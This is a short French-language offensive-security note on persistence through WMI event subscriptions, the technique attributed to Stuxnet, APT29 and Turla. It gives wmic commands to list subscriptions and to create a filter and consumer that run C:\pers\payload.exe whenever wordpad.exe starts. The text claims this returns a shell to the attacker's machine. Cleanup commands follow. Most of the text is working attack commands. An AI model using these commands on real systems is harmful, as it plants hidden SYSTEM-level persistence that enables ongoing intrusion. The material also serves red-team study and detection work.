
> [!NOTE] Stuxnet, APT29, Turla, SeaDuke

WMI (Windows Management Instrumentation) s'executer par defaut an tant que `SYSTEM`

Querying:

```c
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET /format:list
wmic /NAMESPACE:"\\root\subscription" PATH __EventConsumer GET /format:list
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET /format:list
```

Setup:

```c
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="INFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="Select * From __InstanceCreationEvent Within 15 Where (TargetInstance Isa 'Win32_Process' And TargetInstance.Name = 'wordpad.exe')"
```

```c
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="INConsumer", WorkingDirectory="C:\pers", CommandLineTemplate="C:\pers\payload.exe"
```

```c
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"INFilter\"", Consumer="CommandLineEventConsumer.Name=\"INConsumer\""
```

Maintenant losrque le fichier `wordpad.exe` sera ouvert nous reverons un shell sur notre machine attaquante


Removal:

```http
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='INFilter'" DELETE
```

```http
wmic /NAMESPACE:"\\root\subscription" PATH  __EventFilter WHERE Name="INFilter" DELETE
```

```http
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="INConsumer" DELETE
```